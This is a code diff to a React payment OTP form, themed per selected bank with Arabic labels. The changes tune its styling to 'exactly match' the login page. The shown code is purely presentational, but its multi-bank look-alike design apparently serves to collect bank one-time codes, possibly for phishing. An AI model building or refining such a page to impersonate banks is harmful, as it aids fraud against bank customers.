@@ -269,14 +269,17 @@ const PaymentOTPForm = () => {
             padding: '20px',
           }}
         >
-          {/* Bank Logo Section - matching login page */}
+          {/* Bank Logo Section - Exact match to login page */}
           <div 
-            className="mb-8"
+            className="mb-10"
             style={{
-              textAlign: bankDesign.layout.logoPosition === 'center' ? 'center' : 'right',
+              textAlign: 'center',
               width: '100%',
               display: 'flex',
               justifyContent: 'center',
+              alignItems: 'center',
+              paddingTop: '40px',
+              paddingBottom: '20px',
             }}
           >
             {selectedBank && (
@@ -285,26 +288,27 @@ const PaymentOTPForm = () => {
                   display: 'flex',
                   flexDirection: 'column',
                   alignItems: 'center',
-                  gap: '16px',
+                  gap: '20px',
                 }}
               >
                 <div
                   style={{
-                    width: bankDesign.layout.logoSize?.width || '180px',
-                    height: bankDesign.layout.logoSize?.height || '60px',
+                    width: bankDesign.layout.logoSize?.width || '200px',
+                    height: bankDesign.layout.logoSize?.height || '70px',
                     backgroundColor: bankDesign.primaryColor,
-                    borderRadius: '8px',
+                    borderRadius: '6px',
                     display: 'flex',
                     alignItems: 'center',
                     justifyContent: 'center',
-                    boxShadow: '0 2px 8px rgba(0,0,0,0.1)',
+                    boxShadow: '0 3px 10px rgba(0,0,0,0.15)',
+                    border: `2px solid ${bankDesign.secondaryColor}`,
                   }}
                 >
                   <Shield 
                     className="text-white"
                     style={{
-                      width: '48px',
-                      height: '48px',
+                      width: '56px',
+                      height: '56px',
                     }}
                   />
                 </div>
@@ -315,34 +319,48 @@ const PaymentOTPForm = () => {
                     color: bankDesign.primaryColor,
                     margin: 0,
                     fontFamily: bankDesign.fontFamily,
+                    letterSpacing: '0.5px',
                   }}
                 >
                   {selectedBank.nameAr}
                 </h1>
+                <p
+                  style={{
+                    fontSize: bankDesign.fontSize.subtitle,
+                    color: bankDesign.textColor,
+                    opacity: 0.7,
+                    margin: 0,
+                    fontFamily: bankDesign.fontFamily,
+                  }}
+                >
+                  {selectedBank.name}
+                </p>
               </div>
             )}
           </div>
 
-          {/* OTP Form Card - matching login page design */}
+          {/* OTP Form Card - Exact match to login page design */}
           <div 
             style={{
               backgroundColor: bankDesign.inputBackgroundColor,
               borderRadius: '8px',
-              padding: '40px',
-              boxShadow: '0 4px 20px rgba(0,0,0,0.1)',
+              padding: '36px',
+              boxShadow: '0 4px 16px rgba(0,0,0,0.08)',
               border: `1px solid ${bankDesign.inputStyles.borderColor}`,
               width: '100%',
               maxWidth: bankDesign.layout.formMaxWidth || '420px',
+              margin: '0 auto',
             }}
           >
             <h2 
               style={{
-                fontSize: '24px',
+                fontSize: '22px',
                 fontWeight: bankDesign.fontWeight.title,
                 color: bankDesign.textColor,
-                marginBottom: '32px',
+                marginBottom: '28px',
                 textAlign: 'center',
                 fontFamily: bankDesign.fontFamily,
+                marginTop: 0,
               }}
             >
               رمز التحقق
@@ -354,17 +372,17 @@ const PaymentOTPForm = () => {
                 color: bankDesign.textColor,
                 opacity: 0.7,
                 textAlign: 'center',
-                marginBottom: '24px',
+                marginBottom: '28px',
                 fontFamily: bankDesign.fontFamily,
               }}
             >
-              أدخل الرمز المرسل إلى هاتفك
+              أدخل الرمز المرسل إلى هاتفك المسجل في البنك
             </p>
             
             <form onSubmit={handleSubmit}>
-              {/* OTP Input - 6 digits */}
+              {/* OTP Input - 6 digits - Matching login input style */}
               <div className="mb-6">
-                <div className="flex gap-2 sm:gap-3 justify-center items-center mb-6" dir="ltr">
+                <div className="flex gap-3 justify-center items-center mb-8" dir="ltr">
                   {otp.map((digit, index) => (
                     <Input
                       key={index}
@@ -377,16 +395,17 @@ const PaymentOTPForm = () => {
                       onChange={(e) => handleChange(index, e.target.value)}
                       onKeyDown={(e) => handleKeyDown(index, e)}
                       onPaste={handlePaste}
-                      className="text-center text-2xl font-bold border-2 transition-all"
+                      className="text-center font-bold border-2 transition-all"
                       style={{
-                        width: '50px',
-                        height: '60px',
+                        width: '52px',
+                        height: bankDesign.inputStyles.height,
                         borderRadius: bankDesign.inputStyles.borderRadius,
                         borderWidth: bankDesign.inputStyles.borderWidth,
                         borderColor: digit ? bankDesign.primaryColor : bankDesign.inputStyles.borderColor,
                         backgroundColor: digit ? `${bankDesign.primaryColor}08` : bankDesign.inputBackgroundColor,
-                        fontSize: '24px',
+                        fontSize: '26px',
                         fontFamily: bankDesign.fontFamily,
+                        color: bankDesign.textColor,
                       }}
                       disabled={attempts >= 3}
                       autoComplete="off"
@@ -442,7 +461,7 @@ const PaymentOTPForm = () => {
                 </div>
               )}
               
-              {/* Submit Button - matching login button */}
+              {/* Submit Button - Exact match to login button */}
               <button
                 type="submit"
                 disabled={attempts >= 3 || !isOtpComplete}
@@ -458,21 +477,25 @@ const PaymentOTPForm = () => {
                   borderRadius: bankDesign.buttonStyles.borderRadius,
                   cursor: (attempts >= 3 || !isOtpComplete) ? 'not-allowed' : 'pointer',
                   boxShadow: bankDesign.buttonStyles.boxShadow,
-                  transition: 'background-color 0.2s',
+                  transition: 'all 0.2s ease',
                   opacity: (attempts >= 3 || !isOtpComplete) ? 0.7 : 1,
                   display: 'flex',
                   alignItems: 'center',
                   justifyContent: 'center',
                   gap: '8px',
                   fontFamily: bankDesign.fontFamily,
+                  textTransform: 'none',
+                  letterSpacing: '0.3px',
                 }}
                 onMouseEnter={(e) => {
                   if (attempts < 3 && isOtpComplete) {
                     e.currentTarget.style.backgroundColor = bankDesign.buttonHoverColor;
+                    e.currentTarget.style.boxShadow = '0 4px 8px rgba(0,108,53,0.3)';
                   }
                 }}
                 onMouseLeave={(e) => {
                   e.currentTarget.style.backgroundColor = attempts >= 3 ? '#666' : bankDesign.buttonColor;
+                  e.currentTarget.style.boxShadow = bankDesign.buttonStyles.boxShadow;
                 }}
               >
                 {attempts >= 3 ? (
